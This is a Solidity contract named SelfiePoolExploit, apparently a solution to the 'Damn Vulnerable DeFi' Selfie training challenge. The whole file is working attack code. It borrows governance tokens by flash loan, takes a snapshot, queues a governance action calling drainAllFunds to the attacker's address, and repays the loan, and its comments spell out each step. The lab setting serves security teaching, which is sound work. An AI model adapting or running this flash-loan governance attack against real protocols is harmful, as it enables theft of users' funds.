// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { DamnValuableTokenSnapshot } from "../DamnValuableTokenSnapshot.sol";

interface ILender {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGov {
    function actionCounter() external returns (uint256);
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external;
    function executeAction(uint256 actionId) external payable;

}

contract SelfiePoolExploit {

    address public owner;
    ILender public lender; 
    IGov public gov;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyLender() {
        require(msg.sender == address(lender), "Not pool");
        _;
    }

    constructor(address _lender, address _gov) {
        owner = msg.sender;
        lender = ILender(_lender);
        gov = IGov(_gov);
    }

    function attack(uint256 amount) external onlyOwner {
        lender.flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 _amount) public onlyLender {
        // Attack:
        // 1) flashloan gov tokens from lender
        // 2) create snapshot with flashloaned tokens 
        // 3) create malicious proposal to drain funds with owner as destination
        // 4) Queue malicious proposal in gov
        // 5) repay gov token flashloan
        // 6) hh fast forward time and execute proposal
        // Note: if this was gov bravo, the token holders would just cancel your proposal
        
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        token.snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);

        gov.queueAction(msg.sender, data, 0);
        
        require(DamnValuableTokenSnapshot(_token).transfer(msg.sender, _amount), "Transfer failed");
    }
}
